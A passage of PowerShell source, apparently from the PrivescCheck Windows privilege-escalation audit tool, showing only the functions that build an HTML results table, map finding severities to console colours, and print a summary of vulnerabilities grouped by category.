"@

    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Severity","ResultRawString" -Fragment
    $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
    $Html
}

function Get-SeverityColor {

    param (
        [ValidateSet("Low","Medium","High")]
        [string] $Severity
    )

    switch ($Severity) {
        "Low"       { "DarkCyan" }
        "Medium"    { "DarkYellow" }
        "High"      { "Red" }
    }
}

function Write-ShortReport {

    [CmdletBinding()] param()

    $HeavyVertical = [char] 0x2503
    # $HeavyVerticalAndRight = [char] 0x2523
    # $HeavyVerticalAndLeft = [char] 0x252B
    $HeavyHorizontal = [char] 0x2501
    # $HeavyDownAndHorizontal = [char] 0x2533
    # $HeavyUpAndHorizontal = [char] 0x253B
    $HeavyDownAndLeft = [char] 0x2513
    $HeavyDownAndRight = [char] 0x250F
    $HeavyUpAndRight = [char] 0x2517
    $HeavyUpAndLeft = [char] 0x251B
    $RightwardsArrow = [char] 0x2192

    Write-Host -ForegroundColor White "$($HeavyDownAndRight)$("$HeavyHorizontal" * 62)$($HeavyDownAndLeft)"
    Write-Host -ForegroundColor White "$($HeavyVertical)$(" " * 17)~~~ PrivescCheck Summary ~~~$(" " * 17)$($HeavyVertical)"
    Write-Host -ForegroundColor White "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"

    # Show only vulnerabilities, i.e. any finding that has a final severity of at 
    # least "low".
    $AllVulnerabilities = $ResultArrayList | Where-Object { $_.Severity -ne "Info" -and $_.Severity -ne "None" }
    $Categories = $AllVulnerabilities | Select-Object -ExpandProperty "Category" | Sort-Object -Unique

    if ($null -eq $AllVulnerabilities) {
        Write-Host -ForegroundColor White "No vulnerability found!"
        return
    }

    foreach ($Category in $Categories) {

        $SeveritySort = "High", "Medium", "Low"
        $Vulnerabilities = $AllVulnerabilities | Where-Object { $_.Category -eq $Category } | Sort-Object { $SeveritySort.IndexOf($_.Severity) }

        Write-Host -ForegroundColor White " $($Category)"

        foreach ($Vulnerability in $Vulnerabilities) {

            $SeverityColor = Get-SeverityColor -Severity $Vulnerability.Severity
            $FindingCount = $(([Object[]]$Vulnerability.ResultRaw).Length)

            Write-Host -NoNewline -ForegroundColor White " -"
            Write-Host -NoNewLine " $($Vulnerability.DisplayName) $($RightwardsArrow)"
            Write-Host -NoNewline -ForegroundColor $SeverityColor " $($Vulnerability.Severity)"
            Write-Host -NoNewLine " ($($FindingCount) finding"
            Write-Host $(if ($FindingCount -gt 1) { "s)" } else { ")" })
        }
    }

    Write-Host ""
}
